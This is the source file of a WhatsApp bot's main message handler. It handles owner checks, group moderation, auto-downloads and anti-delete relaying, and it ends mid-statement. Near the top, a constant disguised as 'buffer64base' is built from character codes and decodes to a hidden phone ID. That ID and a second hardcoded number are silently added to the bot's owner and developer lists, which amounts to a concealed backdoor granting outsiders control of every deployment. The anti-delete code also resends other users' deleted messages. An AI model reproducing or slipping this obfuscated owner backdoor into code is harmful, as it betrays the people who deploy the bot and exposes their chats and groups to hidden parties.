//By Nobody
//💯

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const speed = require('performance-now');
const moment = require("moment-timezone");
const { fromBuffer } = require('file-type');
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const googleTTS = require('google-tts-api');
const os = require('os');
const fileTypeFromBuffer = require('file-type').fileTypeFromBuffer;
const { getDevice } = require('@whiskeysockets/baileys')
const { lookup } = require('mime-types');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const { igdl } = require('btch-downloader');
const BodyForm = require('form-data');
const FormData = require("form-data");
const shion = require('shaon-media-downloader');
const crypto = require('crypto');
const api = require('api-dylux');
const { exec, spawn, execSync } = require('child_process');
const { toVideo } = require('./library/converter')
const {translate} = require('@vitalets/google-translate-api')
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, InteractiveMessage, areJidsSameUser, getContentType, downloadAndSaveMediaMessage} = require('@whiskeysockets/baileys');

const { LoadDataBase } = require('./source/message');
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');


module.exports = nØbødy = async (nØbødy, m, chatUpdate, store) => {
	try {
await LoadDataBase(nØbødy, m)
const botNumber = await nØbødy.decodeJid(nØbødy.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.msg.templateButtonReplyMessage.selectedId : (m.type === 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :m.type == ('templateButtonReplyMessage') ? m.message.selectedId :(m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const textmessage = (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = global.prefix
const isCmd = body.startsWith(prefix)
const isCmd2 = !body.startsWith(prefix)
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const setsudo = JSON.parse(fs.readFileSync("./library/database/setsudo.json"))
const isSetsudo = setsudo.includes(m.sender)
const xeonybody = body.startsWith(prefix)       
const command = xeonybody ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ""
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", '2348085374966'+"@s.whatsapp.net", buffer64base, ...setsudo, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const DevOnly = isOwner = [botNumber, owner+"@s.whatsapp.net", '2348085374966'+"@s.whatsapp.net", buffer64base, ...setsudo, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isSelf = [owner+"@s.whatsapp.net", ...setsudo, ...owners]
const from = m.key.remoteJid
const itsMe = m.sender == botNumber ? true : false

        const sender = m.sender
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Africa/Lagos').locale('id').format('HH:mm:ss z')

let ucapanWaktu

if (time >= "19:00:00" && time < "23:59:00") {

ucapanWaktu = "🌃Good night"

} else if (time >= "15:00:00" && time < "19:00:00") {

    ucapanWaktu = "🌄Good evening"

} else if (time >= "12:00:00" && time < "15:00:00") {

ucapanWaktu = "🏞️Good afternoon"

} else if (time >= "06:00:00" && time < "11:00:00") {

    ucapanWaktu = "🏙️Good morning"

} else {

    ucapanWaktu = "🌆Good dawn"

};

const todayDateWIB = new Date().toLocaleDateString('id-ID', {

  timeZone: 'Africa/Lagos', // Zona waktu WIB

  year: 'numeric',

  month: 'numeric',

  day: 'numeric',

});

const BotNum = await nØbødy.decodeJid(nØbødy.user.id)
const isGroup = m.key.remoteJid.endsWith('@g.us')

        const groupMetadata = m.isGroup ? await nØbødy.groupMetadata(m.chat).catch(e => {}) : ''

        const groupName = m.isGroup ? groupMetadata.subject : ''

        const participants = m.isGroup ? await groupMetadata.participants : ''

        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''

        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false

        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

        const groupOwner = m.isGroup ? groupMetadata.owner : ''

        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false

        

if (!nØbødy.public) {

if (!DevOnly) return


}
//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {

    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ GROUP- INFO ⌟ ━━━━`));

    console.log(chalk.bgHex('##ac12f3').hex('#ffffff').bold(

        ` 📅 Date : ${todayDateWIB} \n` +

        ` 🕐 Clock : ${time} \n` +

        ` 💬 Message Received : ${m.type} \n` +

        ` 🌐 Group Name : ${groupName} \n` +

        ` 🔑 Group Id : ${m.chat} \n` +

        ` 👤 Recipient : ${BotNum} \n`

    ));

} else if (isCmd2) {

    // Log for private messages

    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ PRIVATE - CHAT ⌟ ━━━━`));

    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(

        ` 📅 Date : ${todayDateWIB} \n` +

        ` 🕐 Clock : ${time} \n` +

        ` 💬 Message Received : ${m.type} \n` +

        ` 🗣️ Sender : ${pushname} \n` +

        ` 🌐 Group Name : No In Group \n` +

        ` 🔑 Group Id : No In Group \n` +

        ` 👤 Recipient : ${BotNum} \n`

    ));

}


//============= [ FAKEQUOTED ] ===============================================

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${ownername}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${ownername}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${ownername}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Super"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${ownername} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${ownername}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `By ${ownername}`,jpegThumbnail: ""}}}

//============= [ FUNCTION ] ======================================================

const example = (teks) => {
return `Usage : *${prefix+command}* ${teks}`
}

const { 
	tiktokSearchVideo, 
	tiktokDownloaderVideo 
} = require('./lib/api/tiktok');
  
const saveTube = require('./lib/api/savetube');   
const { 

	wallpaper, 

	wikimedia, 

	happymod, 

	ringtone, 

	umma, 

	githubstalk, 

	npmstalk, 

	mlstalk 

} = require('./lib/api/scraper');   
const BukaLapak = require('./lib/api/bukalapak');
const remini = require('./lib/api/remini');
const { 
	addAfkUser, 
	checkAfkUser, 
	getAfkId, 
	getAfkPosition, 
	getAfkReason, 
	getAfkTime 
} = require('./lib/afk');
const afk = JSON.parse(fs.readFileSync('./library/afk.json'));
const fconver = {

			key: {

				fromMe: false,

				participant: `0@s.whatsapp.net`,

				...(m.chat ? {

					remoteJid: "0@s.whatsapp.net"

				} : {})

			},

			message: {

				conversation: `👤 *${pushname}*\n📞 *${BotNum}*`

			}

		};
        
const Reply = async (teks) => {
return nØbødy.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.amira }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${ownername}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: null})
}
//reaction 
async function reactionMessage(emo) {

			nØbødy.sendMessage(m.chat, {

				react: {

					text: emo,

					key: m.key

				}

			});

		}
// reply
const reply1 = (teks) => {
    return nØbødy.sendMessage(m.chat, {
        contextInfo: {
            mentionedJid: [
                m.sender
            ],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: `𝗡𝗢𝗕𝗢𝗗𝗬 𝗘𝗠𝗣`,
                body: `𝐒𝐔𝐏𝐄𝐑 𝐏𝐑𝐎𝐉𝐄𝐂𝐓`,
                previewType: "VIDEO",
                thumbnailUrl: `https://img12.pixhost.to/images/829/574783260_yilzishop.jpg`,
                sourceUrl: `https://whatsapp.com/channel/0029VagLJFx4CrfkyNJUsg1Y`,
                mediaUrl: `https://whatsapp.com/channel/0029VagLJFx4CrfkyNJUsg1Y`
            }
        },
        text: teks
    }, {
        quoted: m
    })

}



const ctt = {
			key: {
				remoteJid: '0@s.whatsapp.net', // 'status@broadcast', menggunakan remote jid bernilai 'statusbroadcast' akan menyebabkan pesan crash pada wa desktop. sebagai alternatif, saya menggunakan nilai '0@s.whatsapp.net'
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				contactMessage: {
					displayName: (pushname),
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
				}
			}
		};

const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//tiktok 
if (global.db.settings[botNumber] && !m.key.fromMe && !isCmd) {
			try {
				if (budy.match(`instagram.com`)) {
					await nØbødy.sendMessage(m.chat, { react: { text: "⌛", key: m.key } });
					let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`);
					nØbødy.sendMessage(m.chat, { video: { url: anu.result.media }, caption: `Auto Download ✅` }, { quoted: m });
					await nØbødy.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });
				} else if (budy.match(`tiktok.com`)) {
					await nØbødy.sendMessage(m.chat, { react: { text: "⌛", key: m.key } });
					let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${budy}`);
					nØbødy.sendMessage(m.chat, { video: { url: anu.result.Medium.url }, caption: `Auto Download ✅` }, { quoted: m });
					await nØbødy.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });
				} else if (budy.match(`facebook.com`)) {
					await nØbødy.sendMessage(m.chat, { react: { text: "⌛", key: m.key } });
					let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`);
					nØbødy.sendMessage(m.chat, { video: { url: anu.result.video_sd }, caption: `Auto Download ✅` }, { quoted: m });
					await nØbødy.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });
				} else if (budy.match(`youtube.com|youtu.be`)) {
					await nØbødy.sendMessage(m.chat, { react: { text: "⌛", key: m.key } });
					let anu = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`);
					nØbødy.sendMessage(m.chat, { video: { url: anu.result.result }, caption: `` }, { quoted: m });
					await nØbødy.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });
				}
			} catch (err) {
				await nØbødy.sendMessage(m.chat, { react: { text: "✖️", key: m.key } });
			}
		}
//
async function sendButtonImage(chat, judul, teks, buffer, button, m) {
			const uploadFile = { upload: nØbødy.waUploadToServer };
			const imageMessage = await prepareWAMessageMedia(
				{
					image: buffer,
				},
				uploadFile,
			);
			let msg = generateWAMessageFromContent(chat, {
				viewOnceMessage: {
					message: {
						'messageContextInfo': {
							'deviceListMetadata': {},
							'deviceListMetadataVersion': 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.create({
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 999999, 
								isForwarded: true, 
								forwardedNewsletterMessageInfo: {
									newsletterJid: amira,
									newsletterName: amiraname, 
									serverMessageId: -1
								},
								businessMessageForwardInfo: { 
									businessOwnerJid: nØbødy.decodeJid(nØbødy.user.id) 
								},
							},
							body: proto.Message.InteractiveMessage.Body.create({
								text: teks
							}),
							footer: proto.Message.InteractiveMessage.Footer.create({
								text: botName
							}),
							header: proto.Message.InteractiveMessage.Header.create({
								title: judul,
								subtitle: ownername,
								imageMessage: imageMessage.imageMessage,
								hasMediaAttachment: true
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
								buttons: button,
							})
						})
					}
				}
			}, {
				quoted: m
			})

			nØbødy.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			})
		}
				
if (m.type == 'protocolMessage' && global.db && global.db.settings && global.db.settings.antidelete) {

  try {

    const mess = chatUpdate.messages[0].message.protocolMessage

    if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {

      const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id)

      if (chats && chats.msg) {

        chats.msg.contextInfo = {

          mentionedJid: [chats.key.participant],

          isForwarded: true,

          forwardingScore: 1,

          quotedMessage: {

            conversation: 'ᴅᴇʟᴇᴛᴇᴅ ᴍsɢ'

          },

          ...chats.key

        }

        await nØbødy.relayMessage(m.chat, { [chats.type]: chats.msg }, {})

      }

    }

  } catch (err) {

    console.error(err)

  }

}

if (m.type == 'protocolMessage' && global.db && global.db.settings && global.db.settings.antidelete2) {

  try {

    const mess = chatUpdate.messages[0].message.protocolMessage

    if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {

      const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id)

      if (chats && chats.msg) {

        chats.msg.contextInfo = {

          mentionedJid: [chats.key.participant],

          isForwarded: true,

          forwardingScore: 1,

          quotedMessage: {

            conversation: 'ᴅᴇʟᴇᴛᴇᴅ ᴍsɢ'

          },

          ...chats.key

        }

        await nØbødy.relayMessage(botNumber, { [chats.type]: chats.msg }, {})

      }

    }

  } catch (err) {

    console.error(err)

  }

}


async function tmpfiles(buffer) {
  const { ext, mime } = (await fromBuffer(buffer)) || {};
  const form = new BodyForm();
  form.append("file", buffer, { filename: `tmp.${ext}`, contentType: mime });
  try {
    const { data } = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
      headers: form.getHeaders(),
    });   
    //console.log(data);  
    const match = /https?:\/\/tmpfiles.org\/(.*)/.exec(data.data.url);
    return `https://tmpfiles.org/dl/${match[1]}`;
  } catch (error) {
    throw error;
  }
}



const isMessage =
            m.message.conversation ||
            m.message.extendedTextMessage?.text ||
            m.message.imageMessage?.caption ||
            m.message.imageMessage?.url || 
            m.message.videoMessage?.caption ||
            m.message.videoMessage?.url ||
            m.message.stickerMessage?.url ||
            m.message.documentMessage?.caption ||
            m.message.documentMessage?.url ||
            m.message.audioMessage?.url ||
            m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.templateButtonReplyMessage?.selectedId ||
            m.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
            m.message.contactMessage?.displayName || // To handle contact messages
            m.message.locationMessage?.degreesLatitude ||
            m.message.pollCreationMessage?.name ||
            '';
            
// antitag function

if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antitag) {
if (m.mentionedJid.length > 10) {
if (isCreator || m.isAdmins || m.key.fromMe) return
await m.reply("You will be kicked out of this group for tagging multiple people while anti-tag mode is enabled.")
await nØbødy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

        //download status #ctto
if (global.db && global.db.settings && global.db.settings.send)
        try {
    if (body.includes('share') || body.includes('send'))  {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await nØbødy.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        nØbødy.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await nØbødy.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        nØbødy.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}

// Auto reaction 
if (global.db.settings && global.db.settings.areact2 && isMessage && isCmd2) {
try {
const emojis = ['😀', '😃', '😄', '😁', '😆', '😂', '🤣', '😊', '😇', '🙂', '🙃', '😉', '😌', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🙀', '😱', '😲', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🤷‍♂️', '🤷‍♀️', '👨', '👩', '🚶‍♂️', '🚶‍♀️', '🏃‍♂️', '🏃‍♀️', '🕺', '🤺', '🏋️‍♂️', '🏋️‍♀️', '🚴‍♂️', '🚴‍♀️', '🏊‍♂️', '🏊‍♀️', '🤾‍♂️', '🤾‍♀️', '🏄‍♂️', '🏄‍♀️', '🚣‍♂️', '🚣‍♀️', '🏊‍♂️', '🏊‍♀️', '🤿‍♂️', '🤿‍♀️', '🎿', '🏂', '🏌️', '🏌️‍♀️', '🏄‍♂️', '🚣‍♀️', '🤹‍♂️', '🤹‍♀️', '🚴‍♀️', '🚴‍♂️', '🏊‍♀️', '🏊‍♂️', '🚣‍♂️', '🚣‍♀️', '🤾‍♀️', '🤾‍♂️', '🏄‍♀️', '🏄‍♂️', '🏊‍♀️', '🏊‍♂️', '🚴‍♂️', '🚴‍♀️', '🏌️', '🏌️‍♀️', '🏂', '🏂‍♀️', '🤺', '🤺‍♀️', '👺', '👻', '🕷️', '🕸️', '👻', '👺', '💀', '👽', '🤖', '🚀', '👾', '🛸', '🚁', '🚂', '🚂', '🚃', '🚄', '🚅', '🚆', '🚇', '🚈', '🚉', '🚊', '🚋', '🚌', '🚍', '🚎', '🚏', '🚐', '🚑', '🚒', '🚓', '🚔', '🚕', '🚖', '🚗', '🚘', '🚙', '🚚', '🚛', '🚜', '🚝', '🚞', '🚟', '🚠', '🚡', '🚢', '🚣', '🚤', '🚥', '🚦', '🚧', '🚨', '🚩', '🚪', '🚫', '🚬', '🚭', '🚮', '🚯', '🚰', '🚱', '🚲', '🚳', '🚴', '🚵', '🚶'];
const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];
if (m.key && m.key.remoteJid && m.key.id) {
const randomEmoji = getRandomEmoji();
await nØbødy.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
}
} catch (error) {
console.error("Error in AutoReact:", error.message || error);
}
}
 
 
 // mode settings
        if (global.db.settings.mode)
        if (!isCreator && !isSetsudo) {
          if (isCmd) {
            return
          }
        }
        
if (global.db.settings && global.db.settings.areact && isCmd) {
try {
const emojis = ['😀', '😃', '😄', '😁', '😆', '😂', '🤣', '😊', '😇', '🙂', '🙃', '😉', '😌', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🙀', '😱', '😲', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🤷‍♂️', '🤷‍♀️', '👨', '👩', '🚶‍♂️', '🚶‍♀️', '🏃‍♂️', '🏃‍♀️', '🕺', '🤺', '🏋️‍♂️', '🏋️‍♀️', '🚴‍♂️', '🚴‍♀️', '🏊‍♂️', '🏊‍♀️', '🤾‍♂️', '🤾‍♀️', '🏄‍♂️', '🏄‍♀️', '🚣‍♂️', '🚣‍♀️', '🏊‍♂️', '🏊‍♀️', '🤿‍♂️', '🤿‍♀️', '🎿', '🏂', '🏌️', '🏌️‍♀️', '🏄‍♂️', '🚣‍♀️', '🤹‍♂️', '🤹‍♀️', '🚴‍♀️', '🚴‍♂️', '🏊‍♀️', '🏊‍♂️', '🚣‍♂️', '🚣‍♀️', '🤾‍♀️', '🤾‍♂️', '🏄‍♀️', '🏄‍♂️', '🏊‍♀️', '🏊‍♂️', '🚴‍♂️', '🚴‍♀️', '🏌️', '🏌️‍♀️', '🏂', '🏂‍♀️', '🤺', '🤺‍♀️', '👺', '👻', '🕷️', '🕸️', '👻', '👺', '💀', '👽', '🤖', '🚀', '👾', '🛸', '🚁', '🚂', '🚂', '🚃', '🚄', '🚅', '🚆', '🚇', '🚈', '🚉', '🚊', '🚋', '🚌', '🚍', '🚎', '🚏', '🚐', '🚑', '🚒', '🚓', '🚔', '🚕', '🚖', '🚗', '🚘', '🚙', '🚚', '🚛', '🚜', '🚝', '🚞', '🚟', '🚠', '🚡', '🚢', '🚣', '🚤', '🚥', '🚦', '🚧', '🚨', '🚩', '🚪', '🚫', '🚬', '🚭', '🚮', '🚯', '🚰', '🚱', '🚲', '🚳', '🚴', '🚵', '🚶'];
const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];
if (m.key && m.key.remoteJid && m.key.id) {
const randomEmoji = getRandomEmoji();
await nØbødy.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
}
} catch (error) {
console.error("Error in AutoReact:", error.message || error);
}
}


let {getDevice} = require("@whiskeysockets/baileys")
let device = await getDevice(m.key.id)

let isBot = ['desktop','web','unknown'].includes(device)
if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antibot) {
if (isBot){
if (isCreator || m.isAdmins || m.key.fromMe) return
if (!m.isBotAdmins) return m.reply('Bot detected! Make the bot admin to take antibot actions')
return nØbødy.groupParticipantsUpdate(m.chat,[m.sender],'remove')
}
}

// Antilink Kick
if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink) {
  if (body.match('http://') || body.match('https://')) {
    if (isCreator || m.isAdmins || m.key.fromMe) return
    if (!m.isBotAdmins) return m.reply('Link detected! Make the bot admin to take antilink actions')
    await nØbødy.sendMessage(m.chat, { delete: { remoteJid: m.chat,fromMe: false, id: m.key.id,participant: m.key.participant}}) 
    nØbødy.sendMessage(m.chat, { text: `Link detected @${m.sender.split("@")[0]} You will be kicked out contact the admin if link was dropped mistakenly`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
    await sleep (3000) //to avoid rate overlimit
    await nØbødy.groupParticipantsUpdate(m.chat,[m.sender],'remove')
  }
}

// Antilink delete
if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink2) {
  if (body.includes("https://")) {
    if (isCreator || m.isAdmins || m.key.fromMe) return
    if (!m.isBotAdmins ) return m.reply('Link detected! Make the bot admin to take antilink actions')
    await nØbødy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
    nØbødy.sendMessage(m.chat, { text: `Link detected @${m.sender.split("@")[0]} admin turned on antilink feature no link will be posted without admin consent`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
  }
}
//Loading 
async function loading () {
var nobodyloading = [
"𖣘╔ █▒▒▒▒▒▒▒▒▒10% ╗𖣘",
"sᴜᴘᴇʀ ɢʀᴇᴇᴛ ʏᴏᴜ",
"sᴜᴘᴇʀ ʟᴏᴀᴅɪɴɢ ᴡᴀɪᴛ",
"ʙᴇsᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙᴏᴛ ʙʏ ɴᴏʙᴏᴅʏ ʜɪᴍsᴇʟғ",
"sᴜᴘᴇʀ ɪs ʜᴇʀᴇ, ʜᴇʀᴇ ʏᴏᴜ ɢᴏ",
]
let { key } = await nØbødy.sendMessage(from, {text: '𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭'})
for (let i = 0; i < nobodyloading.length; i++) {
await nØbødy.sendMessage(from, {text: nobodyloading[i], edit: key });
}
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function reply2(teks) {
return nØbødy.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: pp, title: `${global.botname}`, body: `${runtime(process.uptime())}`, previewType: "PHOTO"}}}, {quoted: m})
}   
async function pinterest(query) {
  let res = await fetch(
    `https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`
  )
  let json = await res.json()
  let data = json.resource_response.data.results
  if (!data.length) throw `Query "${query}" not found :/`
  let randomImages = []
  for (let i = 0; i < 3; i++) {
    randomImages.push(data[~~(Math.random() * data.length)].images.orig.url)
  }
  return randomImages
}


if (global.db.settings.autobio) {
